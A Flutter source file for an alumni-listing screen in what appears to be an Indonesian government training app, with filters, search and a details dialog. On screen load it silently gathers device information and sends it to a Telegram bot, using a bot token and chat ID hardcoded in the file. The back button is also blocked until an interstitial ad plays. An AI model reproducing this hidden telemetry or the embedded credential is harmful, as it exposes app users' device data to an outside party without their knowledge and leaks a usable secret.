import 'package:bpsdm_mobilev1/ads/interstitial_ads_page.dart';
import 'package:bpsdm_mobilev1/model/alumni_model.dart';
import 'package:bpsdm_mobilev1/providers/ad_provider.dart';
import 'package:bpsdm_mobilev1/providers/api_provider.dart';
import 'package:bpsdm_mobilev1/screen/widget/detail_peserta_dialog.dart';
import 'package:bpsdm_mobilev1/screen/widget/dropdown_jenis.dart';
import 'package:bpsdm_mobilev1/screen/widget/shimmer_box.dart';
import 'package:bpsdm_mobilev1/services/device_info_helper.dart';
import 'package:bpsdm_mobilev1/services/tele_helper.dart';
import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:google_mobile_ads/google_mobile_ads.dart';
import 'package:intl/date_symbol_data_local.dart';
import 'package:intl/intl.dart';

class AlumniScreen extends ConsumerStatefulWidget {
  const AlumniScreen({super.key});

  @override
  // ignore: library_private_types_in_public_api
  _AlumniScreenState createState() => _AlumniScreenState();
}

String formatTanggal(String input) {
  try {
    initializeDateFormatting('id_ID', '');
    // Pisahkan tanggal awal & akhir dari string
    List<String> dates = input.split(" s/d ");
    // print(dates);
    if (dates.length != 2) return "Format tidak valid";

    // Parsing tanggal dari format `yyyy-MM-dd`
    DateTime startDate = DateTime.parse(dates[0]);
    DateTime endDate = DateTime.parse(dates[1]);

    // print('start: $startDate');
    // print('end: $endDate');
    // Format tanggal ke `dd MMMM yyyy`
    String formattedStart =
        DateFormat("d MMMM yyyy", "id_ID").format(startDate);
    String formattedEnd = DateFormat("d MMMM yyyy", "id_ID").format(endDate);
    // print('return: $formattedStart');
    if (formattedStart == formattedEnd) {
      return formattedStart;
    } else {
      return "$formattedStart - $formattedEnd";
    }
    // print('return: formattedStart');
    // return "$formattedStart - $formattedEnd";
  } catch (e) {
    return "Format tidak valid";
  }
}

String ellipsisText(String text, int maxLength) {
  return (text.length > maxLength)
      ? "${text.substring(0, maxLength)}..."
      : text;
}

class _AlumniScreenState extends ConsumerState<AlumniScreen> {
  String selectedYear = "2025"; // Default tahun
  String selectedKodeJenis = "0"; // Default jenis
  String searchQuery = "";

  final InterstitialAdHelper _adHelper = InterstitialAdHelper();

  final DeviceInfoHelper deviceInfoHelper = DeviceInfoHelper(
    telegramHelper: TelegramHelper(
      botToken:
          '7678341666:AAH_6GTin6WCzxx0zOoySoeZfz6b8FgRfFU', // Ganti dengan token bot Anda
      chatId: '111519789', // Ganti dengan chat ID Anda
    ),
  );
  bool isLoading = true;

  Future<void> _loadAndSendDeviceInfo() async {
    try {
      await deviceInfoHelper.getAndSendDeviceInfo();
      setState(() {
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        isLoading = false;
      });
    }
  }

  @override
  void initState() {
    super.initState();
    _loadAndSendDeviceInfo();
    _adHelper.loadAd(() {
      Navigator.pop(context); // 🔄 Kembali ke Home setelah iklan ditutup
    });
  }

  /// 🔹 Tangani event "Back"
  bool _onWillPop() {
    _adHelper.showAd(context);
    return false; // ❌ Cegah navigasi langsung tanpa menampilkan iklan
  }

  @override
  void dispose() {
    _adHelper.disposeAd();
    super.dispose();
  }

  final List<String> years = [
    "2025",
    "2024",
    "2023",
    "2022",
    "2021",
    "2020",
  ];
  // final List<String> pelatihanList = ["Semua", "Orientasi", "Manajerial"];
  final TextEditingController _searchController = TextEditingController();

  void showDetailDialogNew(BuildContext context, Alumni alumni) {
    showModalBottomSheet(
      context: context,
      isScrollControlled: true,
      shape: const RoundedRectangleBorder(
        borderRadius: BorderRadius.vertical(top: Radius.circular(20)),
      ),
      backgroundColor: Colors.white,
      builder: (context) {
        return DetailPesertaDialog(
          namaPeserta: alumni.namaPeserta,
          nip: alumni.nip ?? "",
          instansiPeserta: alumni.instansiPeserta,
          namaPelatihan: alumni.namaPelatihan,
          tanggalPelatihan: formatTanggal(alumni.tanggalPelatihan),
        );
      },
    );
  }

  @override
  Widget build(BuildContext context) {
    final alumniState = ref.watch(alumniProvider);
    final bannerAd = ref.watch(bannerAdProvider);

    return PopScope(
      canPop: false, // ❌ Blokir pop biasa agar bisa tampilkan iklan dulu
      onPopInvokedWithResult: (didPop, result) {
        if (!didPop) {
          _onWillPop();
        }
      },
      child: Scaffold(
        appBar: AppBar(
          title: const Text("Data Alumni"),
          centerTitle: true,
          backgroundColor: Colors.white,
        ),
        body: Center(
          child: LayoutBuilder(builder: (context, constraints) {
            double maxWidth =
                constraints.maxWidth > 600 ? 600 : constraints.maxWidth;
            return SizedBox(
              width: maxWidth,
              child: Padding(
                padding: const EdgeInsets.symmetric(horizontal: 12),
                child: Column(
                  crossAxisAlignment: CrossAxisAlignment.start,
                  children: [
                    const SizedBox(height: 5),
                    // Dropdown Tahun
                    DropdownJenis(
                      selectedKodeJenis: selectedKodeJenis,
                      onChanged: (newValue) {
                        setState(() {
                          selectedKodeJenis = newValue!;
                        });
                      },
                    ),
                    const SizedBox(height: 10),
                    Row(
                      children: [
                        Expanded(
                          child: DropdownButtonFormField<String>(
                            value: selectedYear,
                            items: years.map((year) {
                              return DropdownMenuItem(
                                  value: year, child: Text(year));
                            }).toList(),
                            onChanged: (value) {
                              setState(() {
                                selectedYear = value!;
                              });
                            },
                            decoration: InputDecoration(
                              contentPadding: const EdgeInsets.symmetric(
                                  horizontal: 16, vertical: 14),
                              border: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12.0),
                                borderSide:
                                    const BorderSide(color: Colors.grey),
                              ),
                              enabledBorder: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12.0),
                                borderSide:
                                    const BorderSide(color: Colors.grey),
                              ),
                              focusedBorder: OutlineInputBorder(
                                borderRadius: BorderRadius.circular(12.0),
                                borderSide: const BorderSide(
                                    color: Colors.blue, width: 2),
                              ),
                              labelText: "Pilih Tahun",
                            ),
                          ),
                        ),
                        Padding(
                          padding: const EdgeInsets.only(left: 10),
                          child: ElevatedButton(
                            onPressed: () {
                              ref
                                  .read(alumniProvider.notifier)
                                  .fetchAlumni(selectedYear, selectedKodeJenis);
                            },
                            style: ElevatedButton.styleFrom(
                              backgroundColor: Colors.teal, // Warna tombol
                              foregroundColor: Colors.white, // Warna teks
                              padding: const EdgeInsets.symmetric(
                                  horizontal: 12, vertical: 12),
                              textStyle: const TextStyle(
                                  fontSize: 14, fontWeight: FontWeight.bold),
                              shape: RoundedRectangleBorder(
                                borderRadius: BorderRadius.circular(
                                    10), // Border radius tombol
                              ),
                              elevation: 4, // Efek shadow
                              shadowColor: Colors.black45, // Warna shadow
                            ),
                            child: const Text("Cari"),
                          ),
                        ),
                      ],
                    ),
                    const SizedBox(height: 5),
                    const Divider(),
                    const SizedBox(height: 5),
                    // TextField untuk pencarian nama peserta
                    TextField(
                      controller: _searchController,
                      onChanged: (value) {
                        setState(() {
                          searchQuery = value;
                        });
                        ref.read(alumniProvider.notifier).searchAlumni(value);
                      },
                      decoration: InputDecoration(
                        labelText: "Cari Nama Peserta",
                        border: const OutlineInputBorder(),
                        prefixIcon: const Icon(Icons.search),
                        suffixIcon: _searchController.text.isNotEmpty
                            ? IconButton(
                                icon: const Icon(Icons.clear),
                                onPressed: () {
                                  FocusScope.of(context).unfocus();
                                  _searchController.clear();
                                  ref
                                      .read(alumniProvider.notifier)
                                      .searchAlumni("");
                                  setState(
                                      () {}); // Refresh UI agar ikon "X" hilang
                                },
                              )
                            : null,
                      ),
                    ),

                    const SizedBox(height: 20),

                    Expanded(
                      child: alumniState.when(
                        data: (alumniList) => alumniList.isEmpty
                            ? const Center(child: Text("Tidak ada data alumni"))
                            : ListView.builder(
                                itemCount: alumniList.length,
                                itemBuilder: (context, index) {
                                  final alumni = alumniList[index];
                                  return ListTile(
                                    leading: CircleAvatar(
                                      child: Text(
                                          "${index + 1}"), // Menampilkan nomor urut
                                    ),
                                    title: Text(alumni.namaPeserta,
                                        style: const TextStyle(
                                            fontWeight: FontWeight.bold,
                                            fontSize: 14)),
                                    // trailing: Text(alumni.nip ?? ""),
                                    subtitle: Text(
                                      ellipsisText(alumni.namaPelatihan, 150),
                                      style: const TextStyle(fontSize: 12),
                                    ),

                                    onTap: () {
                                      showDetailDialogNew(context, alumni);
                                    },
                                  );
                                },
                              ),
                        loading: () => Column(
                            children: List.generate(
                                7, (index) => const ShimmerBox())),
                        error: (error, stack) => Center(
                          child: Column(
                            mainAxisAlignment: MainAxisAlignment.center,
                            children: [
                              const Icon(Icons.error,
                                  color: Colors.red, size: 50),
                              const SizedBox(height: 10),
                              const Text(
                                "Gagal mengambil data. Silakan coba lagi.",
                                textAlign: TextAlign.center,
                                style: TextStyle(
                                    fontSize: 16, fontWeight: FontWeight.bold),
                              ),
                              const SizedBox(height: 20),
                              ElevatedButton.icon(
                                onPressed: () {
                                  ref.read(alumniProvider.notifier).fetchAlumni(
                                      selectedYear,
                                      selectedKodeJenis); // Refresh data
                                },
                                icon: const Icon(Icons.refresh),
                                label: const Text("Coba Lagi"),
                                style: ElevatedButton.styleFrom(
                                  backgroundColor: Colors.blueAccent,
                                  foregroundColor: Colors.white,
                                  padding: const EdgeInsets.symmetric(
                                      vertical: 12, horizontal: 20),
                                ),
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            );
          }),
        ),
        bottomNavigationBar: bannerAd != null
            ? SizedBox(
                height: bannerAd.size.height.toDouble(),
                child: AdWidget(ad: bannerAd),
              )
            : null,
      ),
    );
  }
}
